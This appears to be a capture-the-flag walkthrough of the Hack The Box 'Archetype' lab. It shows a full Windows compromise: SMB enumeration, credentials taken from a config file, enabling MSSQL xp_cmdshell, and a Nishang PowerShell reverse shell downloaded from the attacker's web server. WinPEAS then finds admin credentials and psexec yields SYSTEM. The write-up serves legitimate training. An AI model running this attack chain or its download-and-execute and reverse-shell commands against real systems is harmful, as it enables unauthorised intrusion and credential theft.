# Archetype

URL: https://app.hackthebox.com/starting-point

Level: Very Easy

Start time: 16 Feb 2022, 12:40am GMT+1

End time: 16 Feb 2022, 7:22pm GMT+1


## Walkthrough

### Enumeration

#### NMAP

Basic nmap scan:

```
# Nmap 7.92 scan initiated Wed Feb 16 12:39:58 2022 as: nmap -T4 -p- -oN 01_nmap 10.129.95.187
Nmap scan report for 10.129.95.187
Host is up (0.070s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

# Nmap done at Wed Feb 16 12:40:26 2022 -- 1 IP address (1 host up) scanned in 27.96 seconds
```

Again with -sC and -sV:

```
# Nmap 7.92 scan initiated Wed Feb 16 12:43:52 2022 as: nmap -T4 -p135,139,445,1433,5985,47001 -sC -sV -oN 02_nmap 10.129.95.187
Nmap scan report for 10.129.95.187
Host is up (0.088s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
|_ssl-date: 2022-02-16T11:55:43+00:00; +11m25s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-02-16T11:48:47
|_Not valid after:  2052-02-16T11:48:47
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-02-16T11:55:35
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-02-16T03:55:34-08:00
| ms-sql-info:
|   10.129.95.187:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_clock-skew: mean: 1h47m25s, deviation: 3h34m41s, median: 11m24s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 16 12:44:18 2022 -- 1 IP address (1 host up) scanned in 26.67 seconds
```

With --script=vuln

```
# Nmap 7.92 scan initiated Wed Feb 16 13:20:43 2022 as: nmap -T4 -p135,139,445,1433,5985,47001 --script=vuln -oN 03_nmap_vuln 10.129.95.187
Nmap scan report for 10.129.95.187
Host is up (0.082s latency).

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)
5985/tcp  open  wsman
47001/tcp open  winrm

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false

# Nmap done at Wed Feb 16 13:21:23 2022 -- 1 IP address (1 host up) scanned in 39.32 seconds
```

#### smbclient 

Let's enumerate samba shares (Null Session):

```
# smbclient -N -L \\10.129.211.109

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

Let's browse `backups` share:

```
# smbclient -N \\\\10.129.211.109\\backups
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

                5056511 blocks of size 4096. 2611006 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
smb: \> quit
```

We grabbed `prod.dtsConfig` file:

```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

#### mssqlclient.py

We obtained credentials for MS SQL server. Let's try with `mssqlclient.py` from Impacket suite:

```
# mssqlclient.py sql_svc:'M3g4c0rp123'@10.129.211.109
Impacket v0.9.25.dev1+20220105.151306.10e53952 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] ERROR(ARCHETYPE): Line 1: Login failed for user 'sql_svc'.
```

Again with `-windows-auth` switch:

```
# mssqlclient.py sql_svc:'M3g4c0rp123'@10.129.211.109 -windows-auth
Impacket v0.9.25.dev1+20220105.151306.10e53952 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```			

We cannot execute commands like `whoami`:

```
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd

SQL> xp_cmdshell whoami
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL>
```

We simply run `enable_xp_cmdshell`:

```
SQL> enable_xp_cmdshell
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

And now we are OK:

```
SQL> xp_cmdshell whoami
output

--------------------------------------------------------------------------------

archetype\sql_svc

NULL

SQL>
```

### User flag

From now, we can grab user flag:

```
SQL> xp_cmdshell dir c:\users
output

--------------------------------------------------------------------------------

 Volume in drive C has no label.

 Volume Serial Number is 9565-0B4F

NULL

 Directory of c:\users

NULL

01/19/2020  03:10 PM    <DIR>          .

01/19/2020  03:10 PM    <DIR>          ..

01/19/2020  10:39 PM    <DIR>          Administrator

01/19/2020  10:39 PM    <DIR>          Public

01/20/2020  05:01 AM    <DIR>          sql_svc

               0 File(s)              0 bytes

               5 Dir(s)  10,548,359,168 bytes free

NULL

SQL> xp_cmdshell dir c:\users\sql_svc\Desktop
output

--------------------------------------------------------------------------------

 Volume in drive C has no label.

 Volume Serial Number is 9565-0B4F

NULL

 Directory of c:\users\sql_svc\Desktop

NULL

01/20/2020  05:42 AM    <DIR>          .

01/20/2020  05:42 AM    <DIR>          ..

02/25/2020  06:37 AM                32 user.txt

               1 File(s)             32 bytes

               2 Dir(s)  10,548,359,168 bytes free

NULL

SQL> xp_cmdshell type c:\users\sql_svc\Desktop\user.txt
output

--------------------------------------------------------------------------------

3e7b102e78218e935bf3f4951fec21a3

SQL>
```

#### Nishang

Let's try to gain a CMD shell with Nishang:

https://github.com/samratashok/nishang

```
root@kaligra:/opt/htb-track/Archetype# cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
cp: overwrite './Invoke-PowerShellTcp.ps1'? y
```

Let' add our IP and PORT to the end of script:

```
..
..
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.44 -Port 5555
```

Let's spawn a Python web server:

```
# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Let's download `Invoke-PowerShellTcp.ps1` on target machine:

```
SQL> xp_cmdshell powershell iwr http://10.10.16.44:8000/Invoke-PowerShellTcp.ps1 -o c:\users\sql_svc\Desktop\rev.ps1
output
```

File is downloaded:

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.211.109 - - [17/Feb/2022 16:03:03] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

Check if is actually there:

```
SQL> xp_cmdshell dir c:\users\sql_svc\Desktop\
output

--------------------------------------------------------------------------------

 Volume in drive C has no label.

 Volume Serial Number is 9565-0B4F

NULL

 Directory of c:\users\sql_svc\Desktop

NULL

02/17/2022  07:14 AM    <DIR>          .

02/17/2022  07:14 AM    <DIR>          ..

02/17/2022  07:14 AM             4,402 rev.ps1

02/25/2020  06:37 AM                32 user.txt

               2 File(s)          4,434 bytes

               2 Dir(s)  10,722,959,360 bytes free

NULL

SQL>
```

Let's spawn a netcat listener on port 5555/TCP:

```
root@kaligra:/opt/htb-track/Archetype# nc -nvlp 5555
listening on [any] 5555 ...
```

Let's try getting a reverse shell:

```
SQL> xp_cmdshell powershell c:\users\sql_svc\Desktop\rev.ps1
```

Got shell!

```
connect to [10.10.16.44] from (UNKNOWN) [10.129.211.109] 49676
Windows PowerShell running as user sql_svc on ARCHETYPE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
archetype\sql_svc
PS C:\Windows\system32>
```

Let's download WinPEAS on target.

#### WinPEAS - Privesc

Check if target is 32bit or 64bit:

```
PS C:\Windows\system32> systeminfo

Host Name:                 ARCHETYPE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA442
Original Install Date:     1/19/2020, 10:39:36 PM
System Boot Time:          2/17/2022, 6:40:24 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
..
..
```

We can get binary from carlospolop on github:

https://github.com/carlospolop/PEASS-ng/releases/tag/20220214

```
root@kaligra:/opt/htb-track/Archetype# wget https://github.com/carlospolop/PEASS-ng/releases/download/20220214/winPEASx64.exe
```

Let's transfer winPEAS on target machine:

```
root@kaligra:/opt/htb-track/Archetype# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
PS C:\Windows\system32> iwr http://10.10.16.44:8000/winPEASx64.exe -o c:\users\sql_svc\Desktop\win.exe
PS C:\Windows\system32>
```

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.211.109 - - [17/Feb/2022 16:12:24] "GET /winPEASx64.exe HTTP/1.1" 200 -
```

We know that file is actually on sql_svc Desktop:

```
PS C:\Windows\system32> dir c:\users\sql_svc\Desktop\


    Directory: C:\users\sql_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/17/2022   7:14 AM           4402 rev.ps1
-ar---        2/25/2020   6:37 AM             32 user.txt
-a----        2/17/2022   7:23 AM        1931264 win.exe


PS C:\Windows\system32>
```

Let's run winPEAS!

```
PS C:\Windows\system32> c:\users\sql_svc\Desktop\win.exe
```

![winpeas](https://user-images.githubusercontent.com/42389836/154511478-fd345dcb-3aaa-4578-8256-bf54b03171c2.JPG)

In the last lines, we found an interesting file:

```
???????????? Analyzing Windows Files Files (limit 70)
    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    C:\Users\Default\NTUSER.DAT
    C:\Users\sql_svc\NTUSER.DAT
```

Let's check content:

```
PS C:\Windows\system32> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

We got Administrator credentials!

Now we can use psexec.py (Impacket) to get an elevated shell:

```
# psexec.py Administrator:'MEGACORP_4dm1n!!'@10.129.211.109
Impacket v0.9.25.dev1+20220105.151306.10e53952 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.129.211.109.....
[*] Found writable share ADMIN$
[*] Uploading file OGdFbljh.exe
[*] Opening SVCManager on 10.129.211.109.....
[*] Creating service xIii on 10.129.211.109.....
[*] Starting service xIii.....
[!] Press help for extra shell commands                                                                                                                                                      Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami                                                                                                                                                                  nt authority\system

C:\Windows\system32>
```



